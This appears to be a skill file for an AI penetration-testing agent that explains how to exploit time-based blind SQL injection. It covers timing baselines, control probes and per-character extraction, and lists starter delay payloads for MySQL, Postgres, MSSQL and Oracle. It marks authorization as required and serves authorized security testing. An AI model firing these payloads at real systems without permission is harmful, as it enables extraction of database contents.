---
name: time-based-blind-sqli
description: >-
  Exploit fully-blind SQL injection using a TIME oracle: inject conditional delays and infer
  data from response latency (CWE-89). Invoke when there is no content/error difference at all
  but you can trigger a measurable, condition-dependent delay. Requires statistical timing to
  survive network jitter — never eyeball a single slow response.
family: 04-injection
type: exploit
owasp: [A03:2021]
cwe: [CWE-89]
requires: [util-timing-oracle]
authorization: required
---

# Time-Based Blind SQLi

## Invoke when
- No boolean/error signal exists, but a conditional sleep changes response time reliably.

## Prerequisites & oracle
- A calibrated timing baseline (p50/p90) from `util-timing-oracle`; a chosen delay well above jitter.

## Methodology
1. Baseline latency (many samples); pick delay = baseline_p90 + margin (e.g., 5s).
2. Confirm control: `IF(1=1, SLEEP(5), 0)` delays; `IF(1=2, SLEEP(5), 0)` does not.
3. Extract per character with conditional delay; repeat each probe to reject jitter/outliers.
4. Keep concurrency low to avoid confounding server load.

## Starter payloads (dialect table inline)
- MySQL: `' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>77,SLEEP(5),0)-- -`
- Postgres: `'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -`
- MSSQL: `'; IF (1=1) WAITFOR DELAY '0:0:5'-- -`
- Oracle: `' AND 1=(CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE 0 END)-- -`

## False-positive filters
- One slow response is noise. Require the delay to reproduce across N trials vs a no-delay control.
